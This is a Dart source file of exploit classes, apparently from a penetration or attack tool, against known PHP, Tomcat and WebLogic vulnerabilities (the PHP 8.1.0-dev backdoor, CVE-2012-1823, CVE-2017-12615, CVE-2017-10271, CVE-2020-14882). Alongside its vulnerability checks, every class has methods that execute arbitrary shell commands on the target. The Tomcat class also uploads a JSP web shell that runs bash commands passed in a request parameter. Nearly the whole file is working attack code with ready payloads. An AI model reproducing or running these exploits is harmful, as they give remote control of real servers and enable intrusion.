import 'package:http/http.dart' as http;

import 'exp_result.dart';

class PhpBackdoorExpService {
  final String baseUrl;
  final String phpPath;
  final Duration timeout;

  PhpBackdoorExpService({
    required this.baseUrl,
    this.phpPath = '/index.php',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(
        Uri.parse('$_base$phpPath'),
        headers: {'User-Agentt': 'zerodiumsystem("echo PHP_BACKDOOR_54289");'},
      ).timeout(timeout);
      if (res.body.contains('PHP_BACKDOOR_54289')) {
        return ExpResult(true, 'PHP 8.1.0-dev 后门', 'User-Agentt 后门存在，回显验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'PHP 8.1.0-dev 后门', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http.get(
        Uri.parse('$_base$phpPath'),
        headers: {'User-Agentt': 'zerodiumsystem("$cmd");'},
      ).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class PhpCgiExpService {
  final String baseUrl;
  final String phpPath;
  final Duration timeout;

  PhpCgiExpService({
    required this.baseUrl,
    this.phpPath = '/index.php',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final url =
          '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
      final res = await http
          .post(
            Uri.parse(url),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: '<?php echo "PHP_CGI_54289"; ?>',
          )
          .timeout(timeout);
      if (res.body.contains('PHP_CGI_54289')) {
        return ExpResult(
          true,
          'CVE-2012-1823 (PHP-CGI)',
          'PHP-CGI 参数注入代码执行验证通过',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2012-1823 (PHP-CGI)', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final url =
          '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
      // Escape backslashes and double quotes so they survive inside the PHP
      // double-quoted string literal.
      final escaped = cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
      final res = await http
          .post(
            Uri.parse(url),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: '<?php echo shell_exec("$escaped"); ?>',
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class TomcatExpService {
  final String baseUrl;
  final Duration timeout;

  TomcatExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  static const _shellName = 'mAtrix_t_shell';
  static const _shellContent =
      '<%@ page import="java.util.*,java.io.*"%><%if(request.getParameter("cmd")!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));StringBuilder sb=new StringBuilder();String line;while((line=br.readLine())!=null)sb.append(line).append("\\n");out.print(sb);}%>';

  Future<ExpResult> check() async {
    try {
      const probeJsp = '<% out.print("TOMCAT_JSP_54289"); %>';
      final putJspRes = await http
          .put(
            Uri.parse('$_base/tomcat_check_54289.jsp/'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: probeJsp,
          )
          .timeout(timeout);
      if (putJspRes.statusCode == 201 || putJspRes.statusCode == 204) {
        final jspGetRes =
            await http.get(Uri.parse('$_base/tomcat_check_54289.jsp')).timeout(timeout);
        if (jspGetRes.body.contains('TOMCAT_JSP_54289')) {
          return ExpResult(
            true,
            'CVE-2017-12615',
            'PUT 写入 JSP 并成功执行回显，RCE 链路成立',
          );
        }
      }

      final putRes = await http
          .put(
            Uri.parse('$_base/tomcat_put_test.txt/'),
            headers: {'Content-Type': 'text/plain'},
            body: 'tomcat_put_54289',
          )
          .timeout(timeout);
      if (putRes.statusCode == 201 || putRes.statusCode == 204) {
        final getRes =
            await http.get(Uri.parse('$_base/tomcat_put_test.txt')).timeout(timeout);
        if (getRes.body.contains('tomcat_put_54289')) {
          return ExpResult(true, 'CVE-2017-12615', 'PUT 方法开启，文件写入并读取验证成功');
        }
        return ExpResult(
          true,
          'CVE-2017-12615',
          'PUT 方法开启 (状态 ${putRes.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-12615', '');
  }

  Future<String?> getShell() async {
    try {
      final putRes = await http
          .put(
            Uri.parse('$_base/$_shellName.jsp/'),
            headers: {'Content-Type': 'application/octet-stream'},
            body: _shellContent,
          )
          .timeout(timeout);
      if (putRes.statusCode == 201 || putRes.statusCode == 204) {
        return '$_base/$_shellName.jsp';
      }
    } catch (_) {}
    return null;
  }

  Future<String?> execRce(String cmd) async {
    try {
      await http
          .put(
            Uri.parse('$_base/$_shellName.jsp/'),
            headers: {'Content-Type': 'application/octet-stream'},
            body: _shellContent,
          )
          .timeout(timeout);
      await Future<void>.delayed(const Duration(milliseconds: 300));
      final res = await http
          .get(Uri.parse('$_base/$_shellName.jsp?cmd=${Uri.encodeComponent(cmd)}'))
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class WebLogicExpService {
  final String baseUrl;
  final Duration timeout;

  WebLogicExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _xmlDecoderPayload(String cmd) => '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="3">
    <void index="0"><string>/bin/bash</string></void>
    <void index="1"><string>-c</string></void>
    <void index="2"><string>$cmd</string></void>
  </array>
  <void method="start"/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>''';

  Future<ExpResult> checkCve201710271() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/wls-wsat/CoordinatorPortType'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlDecoderPayload('id'),
          )
          .timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 500) {
        return ExpResult(
          true,
          'CVE-2017-10271',
          'WebLogic XMLDecoder 端点存在 (${res.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-10271', '');
  }

  Future<String?> execRceCve201710271(String cmd) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/wls-wsat/CoordinatorPortType'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlDecoderPayload(cmd),
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : '命令已发送 (状态 ${res.statusCode})，无直接回显';
    } catch (_) {
      return null;
    }
  }

  Future<ExpResult> checkCve202014882() async {
    try {
      final res = await http
          .get(Uri.parse('$_base/console/css/%252e%252e%252fconsole.portal'))
          .timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 302) {
        return ExpResult(
          true,
          'CVE-2020-14882/14883',
          '控制台路径绕过成功 (${res.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2020-14882/14883', '');
  }

  Future<String?> execRceCve202014882(String cmd) async {
    try {
      final shellCmd = cmd
          .replaceAll(r'\', r'\\')
          .replaceAll("'", r"\'");
      final handle = Uri.encodeQueryComponent(
        'com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(\'$shellCmd\');")',
      );
      final url =
          '$_base/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=$handle';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.isNotEmpty ? res.body : '命令已发送 (状态 ${res.statusCode})，无直接回显';
    } catch (_) {
      return null;
    }
  }
}
